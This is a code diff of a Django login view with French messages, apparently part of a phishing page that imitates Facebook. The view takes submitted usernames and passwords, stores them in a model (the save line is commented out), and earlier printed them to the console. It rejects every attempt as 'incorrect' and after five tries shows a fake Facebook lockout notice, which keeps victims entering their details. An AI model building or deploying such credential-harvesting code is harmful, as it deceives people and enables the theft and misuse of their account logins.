@@ -1,20 +1,33 @@
 from django.shortcuts import render
-from . forms import ConnexionForm
 from django.contrib import messages
+from . models import Connexion
 
 # Create your views here.
 def index(request):
+    context = {}
     if request.method=="POST":
-        form = ConnexionForm(request.POST)
-        if form.is_valid:
-            username = request.POST.get('username')
-            password = request.POST.get('password')
-            print(f'username : {username}')
-            print(f'password: {password}')
-            # form.save()
-        else:
-            messages.error("votre saisi est incorrect")
+        username = request.POST.get('username')
+        password = request.POST.get('password')
 
-    form = ConnexionForm()
-    context = {'form': form}
-    return render(request, 'app/index.html', context)
+        auth = Connexion()
+        auth.username = username
+        auth.password = password
+        # auth.save()
+        try:
+            request.session['delay'] += 1
+        except:
+            request.session['delay'] = 1
+        
+        if request.session['delay'] == 5:
+            print("Trop de tentatifs. Votre facebook est temporairement bloqué")
+            print("Réessayer dans 4 minutes")
+            context['limited'] = request.session.get('delay')
+            
+            request.session.set_expiry(60*3) # 3 minutes se expire
+
+        print(request.session.get('delay'))
+
+        messages.info(request, "Votre identifiant ou mot de passe incorrect. Réessayer")
+        return render(request, 'app/index.html', context)
+            
+    return render(request, 'app/index.html')
